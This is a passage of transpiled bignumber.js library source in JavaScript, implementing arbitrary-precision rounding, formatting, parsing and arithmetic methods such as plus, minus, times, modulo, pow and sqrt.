        }

        return q;
      };
    }();
    /*
     * Return a string representing the value of BigNumber n in fixed-point or exponential
     * notation rounded to the specified decimal places or significant digits.
     *
     * n: a BigNumber.
     * i: the index of the last digit required (i.e. the digit that may be rounded up).
     * rm: the rounding mode.
     * id: 1 (toExponential) or 2 (toPrecision).
     */


    function format(n, i, rm, id) {
      var c0, e, ne, len, str;
      if (rm == null) rm = ROUNDING_MODE;else intCheck(rm, 0, 8);
      if (!n.c) return n.toString();
      c0 = n.c[0];
      ne = n.e;

      if (i == null) {
        str = coeffToString(n.c);
        str = id == 1 || id == 2 && ne <= TO_EXP_NEG ? toExponential(str, ne) : toFixedPoint(str, ne, '0');
      } else {
        n = round(new BigNumber(n), i, rm); // n.e may have changed if the value was rounded up.

        e = n.e;
        str = coeffToString(n.c);
        len = str.length; // toPrecision returns exponential notation if the number of significant digits
        // specified is less than the number of digits necessary to represent the integer
        // part of the value in fixed-point notation.
        // Exponential notation.

        if (id == 1 || id == 2 && (i <= e || e <= TO_EXP_NEG)) {
          // Append zeros?
          for (; len < i; str += '0', len++) {
            ;
          }

          str = toExponential(str, e); // Fixed-point notation.
        } else {
          i -= ne;
          str = toFixedPoint(str, e, '0'); // Append zeros?

          if (e + 1 > len) {
            if (--i > 0) for (str += '.'; i--; str += '0') {
              ;
            }
          } else {
            i += e - len;

            if (i > 0) {
              if (e + 1 == len) str += '.';

              for (; i--; str += '0') {
                ;
              }
            }
          }
        }
      }

      return n.s < 0 && c0 ? '-' + str : str;
    } // Handle BigNumber.max and BigNumber.min.


    function maxOrMin(args, method) {
      var m,
          n,
          i = 0;
      if (isArray(args[0])) args = args[0];
      m = new BigNumber(args[0]);

      for (; ++i < args.length;) {
        n = new BigNumber(args[i]); // If any number is NaN, return NaN.

        if (!n.s) {
          m = n;
          break;
        } else if (method.call(m, n)) {
          m = n;
        }
      }

      return m;
    }
    /*
     * Strip trailing zeros, calculate base 10 exponent and check against MIN_EXP and MAX_EXP.
     * Called by minus, plus and times.
     */


    function normalise(n, c, e) {
      var i = 1,
          j = c.length; // Remove trailing zeros.

      for (; !c[--j]; c.pop()) {
        ;
      } // Calculate the base 10 exponent. First get the number of digits of c[0].


      for (j = c[0]; j >= 10; j /= 10, i++) {
        ;
      } // Overflow?


      if ((e = i + e * LOG_BASE - 1) > MAX_EXP) {
        // Infinity.
        n.c = n.e = null; // Underflow?
      } else if (e < MIN_EXP) {
        // Zero.
        n.c = [n.e = 0];
      } else {
        n.e = e;
        n.c = c;
      }

      return n;
    } // Handle values that fail the validity test in BigNumber.


    parseNumeric = function () {
      var basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i,
          dotAfter = /^([^.]+)\.$/,
          dotBefore = /^\.([^.]+)$/,
          isInfinityOrNaN = /^-?(Infinity|NaN)$/,
          whitespaceOrPlus = /^\s*\+(?=[\w.])|^\s+|\s+$/g;
      return function (x, str, isNum, b) {
        var base,
            s = isNum ? str : str.replace(whitespaceOrPlus, ''); // No exception on 卤Infinity or NaN.

        if (isInfinityOrNaN.test(s)) {
          x.s = isNaN(s) ? null : s < 0 ? -1 : 1;
          x.c = x.e = null;
        } else {
          if (!isNum) {
            // basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i
            s = s.replace(basePrefix, function (m, p1, p2) {
              base = (p2 = p2.toLowerCase()) == 'x' ? 16 : p2 == 'b' ? 2 : 8;
              return !b || b == base ? p1 : m;
            });

            if (b) {
              base = b; // E.g. '1.' to '1', '.1' to '0.1'

              s = s.replace(dotAfter, '$1').replace(dotBefore, '0.$1');
            }

            if (str != s) return new BigNumber(s, base);
          } // '[BigNumber Error] Not a number: {n}'
          // '[BigNumber Error] Not a base {b} number: {n}'


          if (BigNumber.DEBUG) {
            throw Error(bignumberError + 'Not a' + (b ? ' base ' + b : '') + ' number: ' + str);
          } // NaN


          x.c = x.e = x.s = null;
        }
      };
    }();
    /*
     * Round x to sd significant digits using rounding mode rm. Check for over/under-flow.
     * If r is truthy, it is known that there are more digits after the rounding digit.
     */


    function round(x, sd, rm, r) {
      var d,
          i,
          j,
          k,
          n,
          ni,
          rd,
          xc = x.c,
          pows10 = POWS_TEN; // if x is not Infinity or NaN...

      if (xc) {
        // rd is the rounding digit, i.e. the digit after the digit that may be rounded up.
        // n is a base 1e14 number, the value of the element of array x.c containing rd.
        // ni is the index of n within x.c.
        // d is the number of digits of n.
        // i is the index of rd within n including leading zeros.
        // j is the actual index of rd within n (if < 0, rd is a leading zero).
        out: {
          // Get the number of digits of the first element of xc.
          for (d = 1, k = xc[0]; k >= 10; k /= 10, d++) {
            ;
          }

          i = sd - d; // If the rounding digit is in the first element of xc...

          if (i < 0) {
            i += LOG_BASE;
            j = sd;
            n = xc[ni = 0]; // Get the rounding digit at index j of n.

            rd = n / pows10[d - j - 1] % 10 | 0;
          } else {
            ni = mathceil((i + 1) / LOG_BASE);

            if (ni >= xc.length) {
              if (r) {
                // Needed by sqrt.
                for (; xc.length <= ni; xc.push(0)) {
                  ;
                }

                n = rd = 0;
                d = 1;
                i %= LOG_BASE;
                j = i - LOG_BASE + 1;
              } else {
                break out;
              }
            } else {
              n = k = xc[ni]; // Get the number of digits of n.

              for (d = 1; k >= 10; k /= 10, d++) {
                ;
              } // Get the index of rd within n.


              i %= LOG_BASE; // Get the index of rd within n, adjusted for leading zeros.
              // The number of leading zeros of n is given by LOG_BASE - d.

              j = i - LOG_BASE + d; // Get the rounding digit at index j of n.

              rd = j < 0 ? 0 : n / pows10[d - j - 1] % 10 | 0;
            }
          }

          r = r || sd < 0 || // Are there any non-zero digits after the rounding digit?
          // The expression  n % pows10[d - j - 1]  returns all digits of n to the right
          // of the digit at j, e.g. if n is 908714 and j is 2, the expression gives 714.
          xc[ni + 1] != null || (j < 0 ? n : n % pows10[d - j - 1]);
          r = rm < 4 ? (rd || r) && (rm == 0 || rm == (x.s < 0 ? 3 : 2)) : rd > 5 || rd == 5 && (rm == 4 || r || rm == 6 && // Check whether the digit to the left of the rounding digit is odd.
          (i > 0 ? j > 0 ? n / pows10[d - j] : 0 : xc[ni - 1]) % 10 & 1 || rm == (x.s < 0 ? 8 : 7));

          if (sd < 1 || !xc[0]) {
            xc.length = 0;

            if (r) {
              // Convert sd to decimal places.
              sd -= x.e + 1; // 1, 0.1, 0.01, 0.001, 0.0001 etc.

              xc[0] = pows10[(LOG_BASE - sd % LOG_BASE) % LOG_BASE];
              x.e = -sd || 0;
            } else {
              // Zero.
              xc[0] = x.e = 0;
            }

            return x;
          } // Remove excess digits.


          if (i == 0) {
            xc.length = ni;
            k = 1;
            ni--;
          } else {
            xc.length = ni + 1;
            k = pows10[LOG_BASE - i]; // E.g. 56700 becomes 56000 if 7 is the rounding digit.
            // j > 0 means i > number of leading zeros of n.

            xc[ni] = j > 0 ? mathfloor(n / pows10[d - j] % pows10[j]) * k : 0;
          } // Round up?


          if (r) {
            for (;;) {
              // If the digit to be rounded up is in the first element of xc...
              if (ni == 0) {
                // i will be the length of xc[0] before k is added.
                for (i = 1, j = xc[0]; j >= 10; j /= 10, i++) {
                  ;
                }

                j = xc[0] += k;

                for (k = 1; j >= 10; j /= 10, k++) {
                  ;
                } // if i != k the length has increased.


                if (i != k) {
                  x.e++;
                  if (xc[0] == BASE) xc[0] = 1;
                }

                break;
              } else {
                xc[ni] += k;
                if (xc[ni] != BASE) break;
                xc[ni--] = 0;
                k = 1;
              }
            }
          } // Remove trailing zeros.


          for (i = xc.length; xc[--i] === 0; xc.pop()) {
            ;
          }
        } // Overflow? Infinity.


        if (x.e > MAX_EXP) {
          x.c = x.e = null; // Underflow? Zero.
        } else if (x.e < MIN_EXP) {
          x.c = [x.e = 0];
        }
      }

      return x;
    } // PROTOTYPE/INSTANCE METHODS

    /*
     * Return a new BigNumber whose value is the absolute value of this BigNumber.
     */


    P.absoluteValue = P.abs = function () {
      var x = new BigNumber(this);
      if (x.s < 0) x.s = 1;
      return x;
    };
    /*
     * Return
     *   1 if the value of this BigNumber is greater than the value of BigNumber(y, b),
     *   -1 if the value of this BigNumber is less than the value of BigNumber(y, b),
     *   0 if they have the same value,
     *   or null if the value of either is NaN.
     */


    P.comparedTo = function (y, b) {
      return compare(this, new BigNumber(y, b));
    };
    /*
     * If dp is undefined or null or true or false, return the number of decimal places of the
     * value of this BigNumber, or null if the value of this BigNumber is 卤Infinity or NaN.
     *
     * Otherwise, if dp is a number, return a new BigNumber whose value is the value of this
     * BigNumber rounded to a maximum of dp decimal places using rounding mode rm, or
     * ROUNDING_MODE if rm is omitted.
     *
     * [dp] {number} Decimal places: integer, 0 to MAX inclusive.
     * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
     *
     * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
     */


    P.decimalPlaces = P.dp = function (dp, rm) {
      var c,
          n,
          v,
          x = this;

      if (dp != null) {
        intCheck(dp, 0, MAX);
        if (rm == null) rm = ROUNDING_MODE;else intCheck(rm, 0, 8);
        return round(new BigNumber(x), dp + x.e + 1, rm);
      }

      if (!(c = x.c)) return null;
      n = ((v = c.length - 1) - bitFloor(this.e / LOG_BASE)) * LOG_BASE; // Subtract the number of trailing zeros of the last number.

      if (v = c[v]) for (; v % 10 == 0; v /= 10, n--) {
        ;
      }
      if (n < 0) n = 0;
      return n;
    };
    /*
     *  n / 0 = I
     *  n / N = N
     *  n / I = 0
     *  0 / n = 0
     *  0 / 0 = N
     *  0 / N = N
     *  0 / I = 0
     *  N / n = N
     *  N / 0 = N
     *  N / N = N
     *  N / I = N
     *  I / n = I
     *  I / 0 = I
     *  I / N = N
     *  I / I = N
     *
     * Return a new BigNumber whose value is the value of this BigNumber divided by the value of
     * BigNumber(y, b), rounded according to DECIMAL_PLACES and ROUNDING_MODE.
     */


    P.dividedBy = P.div = function (y, b) {
      return div(this, new BigNumber(y, b), DECIMAL_PLACES, ROUNDING_MODE);
    };
    /*
     * Return a new BigNumber whose value is the integer part of dividing the value of this
     * BigNumber by the value of BigNumber(y, b).
     */


    P.dividedToIntegerBy = P.idiv = function (y, b) {
      return div(this, new BigNumber(y, b), 0, 1);
    };
    /*
     * Return a BigNumber whose value is the value of this BigNumber exponentiated by n.
     *
     * If m is present, return the result modulo m.
     * If n is negative round according to DECIMAL_PLACES and ROUNDING_MODE.
     * If POW_PRECISION is non-zero and m is not present, round to POW_PRECISION using ROUNDING_MODE.
     *
     * The modular power operation works efficiently when x, n, and m are integers, otherwise it
     * is equivalent to calculating x.exponentiatedBy(n).modulo(m) with a POW_PRECISION of 0.
     *
     * n {number|string|BigNumber} The exponent. An integer.
     * [m] {number|string|BigNumber} The modulus.
     *
     * '[BigNumber Error] Exponent not an integer: {n}'
     */


    P.exponentiatedBy = P.pow = function (n, m) {
      var half,
          isModExp,
          k,
          more,
          nIsBig,
          nIsNeg,
          nIsOdd,
          y,
          x = this;
      n = new BigNumber(n); // Allow NaN and 卤Infinity, but not other non-integers.

      if (n.c && !n.isInteger()) {
        throw Error(bignumberError + 'Exponent not an integer: ' + n);
      }

      if (m != null) m = new BigNumber(m); // Exponent of MAX_SAFE_INTEGER is 15.

      nIsBig = n.e > 14; // If x is NaN, 卤Infinity, 卤0 or 卤1, or n is 卤Infinity, NaN or 卤0.

      if (!x.c || !x.c[0] || x.c[0] == 1 && !x.e && x.c.length == 1 || !n.c || !n.c[0]) {
        // The sign of the result of pow when x is negative depends on the evenness of n.
        // If +n overflows to 卤Infinity, the evenness of n would be not be known.
        y = new BigNumber(Math.pow(+x.valueOf(), nIsBig ? 2 - isOdd(n) : +n));
        return m ? y.mod(m) : y;
      }

      nIsNeg = n.s < 0;

      if (m) {
        // x % m returns NaN if abs(m) is zero, or m is NaN.
        if (m.c ? !m.c[0] : !m.s) return new BigNumber(NaN);
        isModExp = !nIsNeg && x.isInteger() && m.isInteger();
        if (isModExp) x = x.mod(m); // Overflow to 卤Infinity: >=2**1e10 or >=1.0000024**1e15.
        // Underflow to 卤0: <=0.79**1e10 or <=0.9999975**1e15.
      } else if (n.e > 9 && (x.e > 0 || x.e < -1 || (x.e == 0 // [1, 240000000]
      ? x.c[0] > 1 || nIsBig && x.c[1] >= 24e7 // [80000000000000]  [99999750000000]
      : x.c[0] < 8e13 || nIsBig && x.c[0] <= 9999975e7))) {
        // If x is negative and n is odd, k = -0, else k = 0.
        k = x.s < 0 && isOdd(n) ? -0 : 0; // If x >= 1, k = 卤Infinity.

        if (x.e > -1) k = 1 / k; // If n is negative return 卤0, else return 卤Infinity.

        return new BigNumber(nIsNeg ? 1 / k : k);
      } else if (POW_PRECISION) {
        // Truncating each coefficient array to a length of k after each multiplication
        // equates to truncating significant digits to POW_PRECISION + [28, 41],
        // i.e. there will be a minimum of 28 guard digits retained.
        k = mathceil(POW_PRECISION / LOG_BASE + 2);
      }

      if (nIsBig) {
        half = new BigNumber(0.5);
        nIsOdd = isOdd(n);
      } else {
        nIsOdd = n % 2;
      }

      if (nIsNeg) n.s = 1;
      y = new BigNumber(ONE); // Performs 54 loop iterations for n of 9007199254740991.

      for (;;) {
        if (nIsOdd) {
          y = y.times(x);
          if (!y.c) break;

          if (k) {
            if (y.c.length > k) y.c.length = k;
          } else if (isModExp) {
            y = y.mod(m); //y = y.minus(div(y, m, 0, MODULO_MODE).times(m));
          }
        }

        if (nIsBig) {
          n = n.times(half);
          round(n, n.e + 1, 1);
          if (!n.c[0]) break;
          nIsBig = n.e > 14;
          nIsOdd = isOdd(n);
        } else {
          n = mathfloor(n / 2);
          if (!n) break;
          nIsOdd = n % 2;
        }

        x = x.times(x);

        if (k) {
          if (x.c && x.c.length > k) x.c.length = k;
        } else if (isModExp) {
          x = x.mod(m); //x = x.minus(div(x, m, 0, MODULO_MODE).times(m));
        }
      }

      if (isModExp) return y;
      if (nIsNeg) y = ONE.div(y);
      return m ? y.mod(m) : k ? round(y, POW_PRECISION, ROUNDING_MODE, more) : y;
    };
    /*
     * Return a new BigNumber whose value is the value of this BigNumber rounded to an integer
     * using rounding mode rm, or ROUNDING_MODE if rm is omitted.
     *
     * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
     *
     * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {rm}'
     */


    P.integerValue = function (rm) {
      var n = new BigNumber(this);
      if (rm == null) rm = ROUNDING_MODE;else intCheck(rm, 0, 8);
      return round(n, n.e + 1, rm);
    };
    /*
     * Return true if the value of this BigNumber is equal to the value of BigNumber(y, b),
     * otherwise return false.
     */


    P.isEqualTo = P.eq = function (y, b) {
      return compare(this, new BigNumber(y, b)) === 0;
    };
    /*
     * Return true if the value of this BigNumber is a finite number, otherwise return false.
     */


    P.isFinite = function () {
      return !!this.c;
    };
    /*
     * Return true if the value of this BigNumber is greater than the value of BigNumber(y, b),
     * otherwise return false.
     */


    P.isGreaterThan = P.gt = function (y, b) {
      return compare(this, new BigNumber(y, b)) > 0;
    };
    /*
     * Return true if the value of this BigNumber is greater than or equal to the value of
     * BigNumber(y, b), otherwise return false.
     */


    P.isGreaterThanOrEqualTo = P.gte = function (y, b) {
      return (b = compare(this, new BigNumber(y, b))) === 1 || b === 0;
    };
    /*
     * Return true if the value of this BigNumber is an integer, otherwise return false.
     */


    P.isInteger = function () {
      return !!this.c && bitFloor(this.e / LOG_BASE) > this.c.length - 2;
    };
    /*
     * Return true if the value of this BigNumber is less than the value of BigNumber(y, b),
     * otherwise return false.
     */


    P.isLessThan = P.lt = function (y, b) {
      return compare(this, new BigNumber(y, b)) < 0;
    };
    /*
     * Return true if the value of this BigNumber is less than or equal to the value of
     * BigNumber(y, b), otherwise return false.
     */


    P.isLessThanOrEqualTo = P.lte = function (y, b) {
      return (b = compare(this, new BigNumber(y, b))) === -1 || b === 0;
    };
    /*
     * Return true if the value of this BigNumber is NaN, otherwise return false.
     */


    P.isNaN = function () {
      return !this.s;
    };
    /*
     * Return true if the value of this BigNumber is negative, otherwise return false.
     */


    P.isNegative = function () {
      return this.s < 0;
    };
    /*
     * Return true if the value of this BigNumber is positive, otherwise return false.
     */


    P.isPositive = function () {
      return this.s > 0;
    };
    /*
     * Return true if the value of this BigNumber is 0 or -0, otherwise return false.
     */


    P.isZero = function () {
      return !!this.c && this.c[0] == 0;
    };
    /*
     *  n - 0 = n
     *  n - N = N
     *  n - I = -I
     *  0 - n = -n
     *  0 - 0 = 0
     *  0 - N = N
     *  0 - I = -I
     *  N - n = N
     *  N - 0 = N
     *  N - N = N
     *  N - I = N
     *  I - n = I
     *  I - 0 = I
     *  I - N = N
     *  I - I = N
     *
     * Return a new BigNumber whose value is the value of this BigNumber minus the value of
     * BigNumber(y, b).
     */


    P.minus = function (y, b) {
      var i,
          j,
          t,
          xLTy,
          x = this,
          a = x.s;
      y = new BigNumber(y, b);
      b = y.s; // Either NaN?

      if (!a || !b) return new BigNumber(NaN); // Signs differ?

      if (a != b) {
        y.s = -b;
        return x.plus(y);
      }

      var xe = x.e / LOG_BASE,
          ye = y.e / LOG_BASE,
          xc = x.c,
          yc = y.c;

      if (!xe || !ye) {
        // Either Infinity?
        if (!xc || !yc) return xc ? (y.s = -b, y) : new BigNumber(yc ? x : NaN); // Either zero?

        if (!xc[0] || !yc[0]) {
          // Return y if y is non-zero, x if x is non-zero, or zero if both are zero.
          return yc[0] ? (y.s = -b, y) : new BigNumber(xc[0] ? x : // IEEE 754 (2008) 6.3: n - n = -0 when rounding to -Infinity
          ROUNDING_MODE == 3 ? -0 : 0);
        }
      }

      xe = bitFloor(xe);
      ye = bitFloor(ye);
      xc = xc.slice(); // Determine which is the bigger number.

      if (a = xe - ye) {
        if (xLTy = a < 0) {
          a = -a;
          t = xc;
        } else {
          ye = xe;
          t = yc;
        }

        t.reverse(); // Prepend zeros to equalise exponents.

        for (b = a; b--; t.push(0)) {
          ;
        }

        t.reverse();
      } else {
        // Exponents equal. Check digit by digit.
        j = (xLTy = (a = xc.length) < (b = yc.length)) ? a : b;

        for (a = b = 0; b < j; b++) {
          if (xc[b] != yc[b]) {
            xLTy = xc[b] < yc[b];
            break;
          }
        }
      } // x < y? Point xc to the array of the bigger number.


      if (xLTy) t = xc, xc = yc, yc = t, y.s = -y.s;
      b = (j = yc.length) - (i = xc.length); // Append zeros to xc if shorter.
      // No need to add zeros to yc if shorter as subtract only needs to start at yc.length.

      if (b > 0) for (; b--; xc[i++] = 0) {
        ;
      }
      b = BASE - 1; // Subtract yc from xc.

      for (; j > a;) {
        if (xc[--j] < yc[j]) {
          for (i = j; i && !xc[--i]; xc[i] = b) {
            ;
          }

          --xc[i];
          xc[j] += BASE;
        }

        xc[j] -= yc[j];
      } // Remove leading zeros and adjust exponent accordingly.


      for (; xc[0] == 0; xc.splice(0, 1), --ye) {
        ;
      } // Zero?


      if (!xc[0]) {
        // Following IEEE 754 (2008) 6.3,
        // n - n = +0  but  n - n = -0  when rounding towards -Infinity.
        y.s = ROUNDING_MODE == 3 ? -1 : 1;
        y.c = [y.e = 0];
        return y;
      } // No need to check for Infinity as +x - +y != Infinity && -x - -y != Infinity
      // for finite x and y.


      return normalise(y, xc, ye);
    };
    /*
     *   n % 0 =  N
     *   n % N =  N
     *   n % I =  n
     *   0 % n =  0
     *  -0 % n = -0
     *   0 % 0 =  N
     *   0 % N =  N
     *   0 % I =  0
     *   N % n =  N
     *   N % 0 =  N
     *   N % N =  N
     *   N % I =  N
     *   I % n =  N
     *   I % 0 =  N
     *   I % N =  N
     *   I % I =  N
     *
     * Return a new BigNumber whose value is the value of this BigNumber modulo the value of
     * BigNumber(y, b). The result depends on the value of MODULO_MODE.
     */


    P.modulo = P.mod = function (y, b) {
      var q,
          s,
          x = this;
      y = new BigNumber(y, b); // Return NaN if x is Infinity or NaN, or y is NaN or zero.

      if (!x.c || !y.s || y.c && !y.c[0]) {
        return new BigNumber(NaN); // Return x if y is Infinity or x is zero.
      } else if (!y.c || x.c && !x.c[0]) {
        return new BigNumber(x);
      }

      if (MODULO_MODE == 9) {
        // Euclidian division: q = sign(y) * floor(x / abs(y))
        // r = x - qy    where  0 <= r < abs(y)
        s = y.s;
        y.s = 1;
        q = div(x, y, 0, 3);
        y.s = s;
        q.s *= s;
      } else {
        q = div(x, y, 0, MODULO_MODE);
      }

      y = x.minus(q.times(y)); // To match JavaScript %, ensure sign of zero is sign of dividend.

      if (!y.c[0] && MODULO_MODE == 1) y.s = x.s;
      return y;
    };
    /*
     *  n * 0 = 0
     *  n * N = N
     *  n * I = I
     *  0 * n = 0
     *  0 * 0 = 0
     *  0 * N = N
     *  0 * I = N
     *  N * n = N
     *  N * 0 = N
     *  N * N = N
     *  N * I = N
     *  I * n = I
     *  I * 0 = N
     *  I * N = N
     *  I * I = I
     *
     * Return a new BigNumber whose value is the value of this BigNumber multiplied by the value
     * of BigNumber(y, b).
     */


    P.multipliedBy = P.times = function (y, b) {
      var c,
          e,
          i,
          j,
          k,
          m,
          xcL,
          xlo,
          xhi,
          ycL,
          ylo,
          yhi,
          zc,
          base,
          sqrtBase,
          x = this,
          xc = x.c,
          yc = (y = new BigNumber(y, b)).c; // Either NaN, 卤Infinity or 卤0?

      if (!xc || !yc || !xc[0] || !yc[0]) {
        // Return NaN if either is NaN, or one is 0 and the other is Infinity.
        if (!x.s || !y.s || xc && !xc[0] && !yc || yc && !yc[0] && !xc) {
          y.c = y.e = y.s = null;
        } else {
          y.s *= x.s; // Return 卤Infinity if either is 卤Infinity.

          if (!xc || !yc) {
            y.c = y.e = null; // Return 卤0 if either is 卤0.
          } else {
            y.c = [0];
            y.e = 0;
          }
        }

        return y;
      }

      e = bitFloor(x.e / LOG_BASE) + bitFloor(y.e / LOG_BASE);
      y.s *= x.s;
      xcL = xc.length;
      ycL = yc.length; // Ensure xc points to longer array and xcL to its length.

      if (xcL < ycL) zc = xc, xc = yc, yc = zc, i = xcL, xcL = ycL, ycL = i; // Initialise the result array with zeros.

      for (i = xcL + ycL, zc = []; i--; zc.push(0)) {
        ;
      }

      base = BASE;
      sqrtBase = SQRT_BASE;

      for (i = ycL; --i >= 0;) {
        c = 0;
        ylo = yc[i] % sqrtBase;
        yhi = yc[i] / sqrtBase | 0;

        for (k = xcL, j = i + k; j > i;) {
          xlo = xc[--k] % sqrtBase;
          xhi = xc[k] / sqrtBase | 0;
          m = yhi * xlo + xhi * ylo;
          xlo = ylo * xlo + m % sqrtBase * sqrtBase + zc[j] + c;
          c = (xlo / base | 0) + (m / sqrtBase | 0) + yhi * xhi;
          zc[j--] = xlo % base;
        }

        zc[j] = c;
      }

      if (c) {
        ++e;
      } else {
        zc.splice(0, 1);
      }

      return normalise(y, zc, e);
    };
    /*
     * Return a new BigNumber whose value is the value of this BigNumber negated,
     * i.e. multiplied by -1.
     */


    P.negated = function () {
      var x = new BigNumber(this);
      x.s = -x.s || null;
      return x;
    };
    /*
     *  n + 0 = n
     *  n + N = N
     *  n + I = I
     *  0 + n = n
     *  0 + 0 = 0
     *  0 + N = N
     *  0 + I = I
     *  N + n = N
     *  N + 0 = N
     *  N + N = N
     *  N + I = N
     *  I + n = I
     *  I + 0 = I
     *  I + N = N
     *  I + I = I
     *
     * Return a new BigNumber whose value is the value of this BigNumber plus the value of
     * BigNumber(y, b).
     */


    P.plus = function (y, b) {
      var t,
          x = this,
          a = x.s;
      y = new BigNumber(y, b);
      b = y.s; // Either NaN?

      if (!a || !b) return new BigNumber(NaN); // Signs differ?

      if (a != b) {
        y.s = -b;
        return x.minus(y);
      }

      var xe = x.e / LOG_BASE,
          ye = y.e / LOG_BASE,
          xc = x.c,
          yc = y.c;

      if (!xe || !ye) {
        // Return 卤Infinity if either 卤Infinity.
        if (!xc || !yc) return new BigNumber(a / 0); // Either zero?
        // Return y if y is non-zero, x if x is non-zero, or zero if both are zero.

        if (!xc[0] || !yc[0]) return yc[0] ? y : new BigNumber(xc[0] ? x : a * 0);
      }

      xe = bitFloor(xe);
      ye = bitFloor(ye);
      xc = xc.slice(); // Prepend zeros to equalise exponents. Faster to use reverse then do unshifts.

      if (a = xe - ye) {
        if (a > 0) {
          ye = xe;
          t = yc;
        } else {
          a = -a;
          t = xc;
        }

        t.reverse();

        for (; a--; t.push(0)) {
          ;
        }

        t.reverse();
      }

      a = xc.length;
      b = yc.length; // Point xc to the longer array, and b to the shorter length.

      if (a - b < 0) t = yc, yc = xc, xc = t, b = a; // Only start adding at yc.length - 1 as the further digits of xc can be ignored.

      for (a = 0; b;) {
        a = (xc[--b] = xc[b] + yc[b] + a) / BASE | 0;
        xc[b] = BASE === xc[b] ? 0 : xc[b] % BASE;
      }

      if (a) {
        xc = [a].concat(xc);
        ++ye;
      } // No need to check for zero, as +x + +y != 0 && -x + -y != 0
      // ye = MAX_EXP + 1 possible


      return normalise(y, xc, ye);
    };
    /*
     * If sd is undefined or null or true or false, return the number of significant digits of
     * the value of this BigNumber, or null if the value of this BigNumber is 卤Infinity or NaN.
     * If sd is true include integer-part trailing zeros in the count.
     *
     * Otherwise, if sd is a number, return a new BigNumber whose value is the value of this
     * BigNumber rounded to a maximum of sd significant digits using rounding mode rm, or
     * ROUNDING_MODE if rm is omitted.
     *
     * sd {number|boolean} number: significant digits: integer, 1 to MAX inclusive.
     *                     boolean: whether to count integer-part trailing zeros: true or false.
     * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
     *
     * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {sd|rm}'
     */


    P.precision = P.sd = function (sd, rm) {
      var c,
          n,
          v,
          x = this;

      if (sd != null && sd !== !!sd) {
        intCheck(sd, 1, MAX);
        if (rm == null) rm = ROUNDING_MODE;else intCheck(rm, 0, 8);
        return round(new BigNumber(x), sd, rm);
      }

      if (!(c = x.c)) return null;
      v = c.length - 1;
      n = v * LOG_BASE + 1;

      if (v = c[v]) {
        // Subtract the number of trailing zeros of the last element.
        for (; v % 10 == 0; v /= 10, n--) {
          ;
        } // Add the number of digits of the first element.


        for (v = c[0]; v >= 10; v /= 10, n++) {
          ;
        }
      }

      if (sd && x.e + 1 > n) n = x.e + 1;
      return n;
    };
    /*
     * Return a new BigNumber whose value is the value of this BigNumber shifted by k places
     * (powers of 10). Shift to the right if n > 0, and to the left if n < 0.
     *
     * k {number} Integer, -MAX_SAFE_INTEGER to MAX_SAFE_INTEGER inclusive.
     *
     * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {k}'
     */


    P.shiftedBy = function (k) {
      intCheck(k, -MAX_SAFE_INTEGER, MAX_SAFE_INTEGER);
      return this.times('1e' + k);
    };
    /*
     *  sqrt(-n) =  N
     *  sqrt(N) =  N
     *  sqrt(-I) =  N
     *  sqrt(I) =  I
     *  sqrt(0) =  0
     *  sqrt(-0) = -0
     *
     * Return a new BigNumber whose value is the square root of the value of this BigNumber,
     * rounded according to DECIMAL_PLACES and ROUNDING_MODE.
     */


    P.squareRoot = P.sqrt = function () {
      var m,
          n,
          r,
          rep,
          t,
          x = this,
          c = x.c,
          s = x.s,
          e = x.e,
          dp = DECIMAL_PLACES + 4,
          half = new BigNumber('0.5'); // Negative/NaN/Infinity/zero?

      if (s !== 1 || !c || !c[0]) {
        return new BigNumber(!s || s < 0 && (!c || c[0]) ? NaN : c ? x : 1 / 0);
      } // Initial estimate.


      s = Math.sqrt(+x); // Math.sqrt underflow/overflow?
      // Pass x to Math.sqrt as integer, then adjust the exponent of the result.

      if (s == 0 || s == 1 / 0) {
        n = coeffToString(c);
        if ((n.length + e) % 2 == 0) n += '0';
        s = Math.sqrt(n);
        e = bitFloor((e + 1) / 2) - (e < 0 || e % 2);

        if (s == 1 / 0) {
          n = '1e' + e;
        } else {
          n = s.toExponential();
          n = n.slice(0, n.indexOf('e') + 1) + e;
        }

        r = new BigNumber(n);
      } else {
        r = new BigNumber(s + '');
      } // Check for zero.
      // r could be zero if MIN_EXP is changed after the this value was created.
      // This would cause a division by zero (x/t) and hence Infinity below, which would cause
      // coeffToString to throw.


      if (r.c[0]) {
        e = r.e;
        s = e + dp;
        if (s < 3) s = 0; // Newton-Raphson iteration.

        for (;;) {
          t = r;
          r = half.times(t.plus(div(x, t, dp, 1)));

          if (coeffToString(t.c).slice(0, s) === (n = coeffToString(r.c)).slice(0, s)) {
            // The exponent of r may here be one less than the final result exponent,
            // e.g 0.0009999 (e-4) --> 0.001 (e-3), so adjust s so the rounding digits
            // are indexed correctly.
            if (r.e < e) --s;
            n = n.slice(s - 3, s + 1); // The 4th rounding digit may be in error by -1 so if the 4 rounding digits
            // are 9999 or 4999 (i.e. approaching a rounding boundary) continue the
            // iteration.

            if (n == '9999' || !rep && n == '4999') {
              // On the first iteration only, check to see if rounding up gives the
              // exact result as the nines may infinitely repeat.
              if (!rep) {
                round(t, t.e + DECIMAL_PLACES + 2, 0);

                if (t.times(t).eq(x)) {
                  r = t;
                  break;
                }
              }

              dp += 4;
              s += 4;
              rep = 1;
            } else {
              // If rounding digits are null, 0{0,4} or 50{0,3}, check for exact
              // result. If not, then there are further digits and m will be truthy.
              if (!+n || !+n.slice(1) && n.charAt(0) == '5') {
                // Truncate to the first rounding digit.
                round(r, r.e + DECIMAL_PLACES + 2, 1);
                m = !r.times(r).eq(x);
              }

              break;
            }
          }
        }
      }

      return round(r, r.e + DECIMAL_PLACES + 1, ROUNDING_MODE, m);
    };
    /*
     * Return a string representing the value of this BigNumber in exponential notation and
     * rounded using ROUNDING_MODE to dp fixed decimal places.
     *
     * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
     * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
     *
     * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
     */


    P.toExponential = function (dp, rm) {
      if (dp != null) {
        intCheck(dp, 0, MAX);
        dp++;
      }

      return format(this, dp, rm, 1);
    };
